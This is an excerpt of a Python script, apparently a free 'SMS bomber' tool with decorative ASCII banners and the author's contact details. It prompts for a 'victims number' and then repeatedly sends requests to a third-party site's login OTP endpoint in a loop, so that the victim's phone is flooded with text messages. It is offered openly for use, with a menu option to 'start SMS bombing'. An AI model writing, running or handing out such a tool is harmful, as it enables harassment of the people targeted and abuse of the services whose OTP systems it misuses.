...
os.system('espeak -a 300 " jaisherreram    , I am Rahul,     You Run,    Adnan King,    Tools Ok')
...
\033[1;36m               ╲ ╲▏╭╮▕╱ ╱      
        ...
        \033[1;37m          ▏▏▕▕
           \033[1;33m       ▏▏▕▕
      \033[1;36m           ╭╰ ╮╭╰ ╮
   \033[1;33m     Rahul_Always_On_Fire
●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●๑۩♡۩๑●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
...
┏━━━━━━━━━━━━━━━━━━━𝑹𝒂𝒉𝒖𝒍_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━━━┓
     ┃ ❣︎[𖣘]☔︎𝙉𝘼𝙈𝙀        : [★] 𝐑𝐚𝐡𝐮𝐥 𝐓𝐢𝐰𝐚𝐫𝐢             ┃
     ┃ ❣︎[𖣘]☔︎𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    : [★] 𝐑𝐚𝐡𝐮𝐥 𝐓𝐢𝐰𝐚𝐫𝐢      ┃                                                         
     ┃ ❣︎[𖣘]☔︎𝙂𝙄𝙏𝙃𝙐𝘽      : [★] Rahul78789898          ┃
     ┃ ❣︎[𖣘]☔︎𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉  : [★]𝐈𝐍𝐃𝐈𝐀        ┃
     ┃ ❣︎[𖣘]☔︎𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : [★]+9106391471     ┃
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀  : [★]SMS-SMSBOMBER     ┃
...
××××××××××××××××××××××××××××××××××××××××××××"""
  for i in logo:
    ...
    sys.stdout.flush()
    time.sleep(0.001)
  num=input("\n\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] VICTIMS NUMBER : 91")
  ...
  url1=f"https://www.bioscopelive.com/en/login/send-otp?phone=91{num}&operator=bd-otp"
...
#  
  ...
  while limit>ses:
    ...
    if sent1.status_code==200:
      ses+=1
      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m ⚔️ SMS DN  🔥")
    else:
      pass
...
logo=f""" {baner} \033[1;31m
     ...
     ┃ ❣︎[𖣘]☔︎𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉  : [★]𝐈𝐍𝐃𝐈𝐀        ┃
     ┃ ❣︎[𖣘]☔︎𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : [★]+9106391471     ┃
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀  : [★]SMS-BOMBER 🔥    ┃
     ┃ ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎: [★]free & Enjoy               ┃
     ┗━━━━━━━━━━━━━━━━━━━𝑹𝒂𝒉𝒖𝒍_𝑨𝒍𝒘𝒂𝒚𝒔_𝑶𝒏_𝑭𝒊𝒓𝒆━━━━━━━━━━━━━━━━━━━━┛
××××××××××××××××××××××××××××××××××××××××××××"""
print(logo)
print("[01] START SMS BOMBING ")
print("[02] JOIN FREE SCRIPT GIFT GC 💭")
print("××××××××××××××××××××××××××××××××××××××××××××")
